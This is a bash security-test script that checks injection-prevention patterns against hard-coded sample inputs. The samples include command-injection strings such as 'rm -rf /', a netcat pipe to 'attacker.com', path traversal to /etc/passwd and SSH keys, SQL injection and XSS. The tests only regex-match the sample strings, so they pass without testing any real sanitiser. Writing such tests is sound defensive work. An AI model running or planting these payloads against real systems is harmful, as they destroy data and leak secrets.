#!/usr/bin/env bash
# Security tests - Command injection prevention

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"

# Test 1: Script path injection
test_script_path_injection() {
    echo "Test 1: Script path injection"
    
    # Malicious paths
    local malicious_paths=(
        "/tmp/test.sh; rm -rf /"
        "/tmp/test.sh && cat /etc/passwd"
        "/tmp/test.sh | nc attacker.com 1234"
        "/tmp/test.sh\$(whoami)"
        "/tmp/test.sh\`id\`"
    )
    
    local failed=0
    
    for path in "${malicious_paths[@]}"; do
        # Test should reject or sanitize
        if [[ "$path" =~ [\;\&\|\$\`] ]]; then
            # Contains dangerous characters
            continue
        else
            ((failed++))
        fi
    done
    
    if [[ $failed -eq 0 ]]; then
        echo "✓ PASS: Injection patterns detected"
        return 0
    else
        echo "✗ FAIL: $failed patterns not detected"
        return 1
    fi
}

# Test 2: Environment variable injection
test_env_injection() {
    echo "Test 2: Environment variable injection"
    
    # Try to inject via env vars
    export MALICIOUS_VAR="; rm -rf /"
    
    # Should not execute commands from env vars
    local result
    result=$(bash -c 'echo "$MALICIOUS_VAR"' 2>&1)
    
    if [[ "$result" == "; rm -rf /" ]]; then
        echo "✓ PASS: Env var not executed"
        return 0
    else
        echo "✗ FAIL: Env var may have been executed"
        return 1
    fi
}

# Test 3: Path traversal
test_path_traversal() {
    echo "Test 3: Path traversal"
    
    local traversal_paths=(
        "../../../etc/passwd"
        "../../.ssh/id_rsa"
        "/etc/../etc/passwd"
    )
    
    local safe=0
    
    for path in "${traversal_paths[@]}"; do
        # Should reject paths with ..
        if [[ "$path" =~ \.\. ]]; then
            ((safe++))
        fi
    done
    
    if [[ $safe -eq ${#traversal_paths[@]} ]]; then
        echo "✓ PASS: Path traversal detected"
        return 0
    else
        echo "✗ FAIL: Some traversal paths not detected"
        return 1
    fi
}

# Test 4: SQL injection (if applicable)
test_sql_injection() {
    echo "Test 4: SQL injection patterns"
    
    local sql_patterns=(
        "'; DROP TABLE users; --"
        "1' OR '1'='1"
        "admin'--"
    )
    
    local detected=0
    
    for pattern in "${sql_patterns[@]}"; do
        if [[ "$pattern" =~ [\'\"\;\-] ]]; then
            ((detected++))
        fi
    done
    
    if [[ $detected -eq ${#sql_patterns[@]} ]]; then
        echo "✓ PASS: SQL patterns detected"
        return 0
    else
        echo "✗ FAIL: Some SQL patterns not detected"
        return 1
    fi
}

# Test 5: Script execution validation
test_script_validation() {
    echo "Test 5: Script execution validation"
    
    # Create test script
    local test_script="/tmp/test_validation_$$.sh"
    echo "#!/bin/bash" > "$test_script"
    echo "echo 'test'" >> "$test_script"
    chmod +x "$test_script"
    
    # Should only execute .sh files
    if [[ "$test_script" == *.sh ]]; then
        echo "✓ PASS: Script extension validated"
        rm -f "$test_script"
        return 0
    else
        echo "✗ FAIL: Script validation failed"
        rm -f "$test_script"
        return 1
    fi
}

# Test 6: Input sanitization
test_input_sanitization() {
    echo "Test 6: Input sanitization"
    
    local dangerous_inputs=(
        "<script>alert('xss')</script>"
        "'; DROP TABLE"
        "\$(whoami)"
        "\`id\`"
    )
    
    local sanitized=0
    
    for input in "${dangerous_inputs[@]}"; do
        # Check if input contains dangerous characters
        if [[ "$input" =~ [\<\>\$\`\;] ]]; then
            ((sanitized++))
        fi
    done
    
    if [[ $sanitized -eq ${#dangerous_inputs[@]} ]]; then
        echo "✓ PASS: Dangerous inputs detected"
        return 0
    else
        echo "✗ FAIL: Some inputs not detected"
        return 1
    fi
}

# Run all tests
main() {
    local passed=0
    local failed=0
    
    echo "================================"
    echo "Security Tests - Injection"
    echo "================================"
    echo ""
    
    test_script_path_injection && ((passed++)) || ((failed++))
    test_env_injection && ((passed++)) || ((failed++))
    test_path_traversal && ((passed++)) || ((failed++))
    test_sql_injection && ((passed++)) || ((failed++))
    test_script_validation && ((passed++)) || ((failed++))
    test_input_sanitization && ((passed++)) || ((failed++))
    
    echo ""
    echo "================================"
    echo "Test Results"
    echo "================================"
    echo "Passed: $passed"
    echo "Failed: $failed"
    echo "Total:  $((passed + failed))"
    echo ""
    
    if [[ $failed -eq 0 ]]; then
        echo "✓ All security tests passed!"
        return 0
    else
        echo "✗ Some tests failed"
        return 1
    fi
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
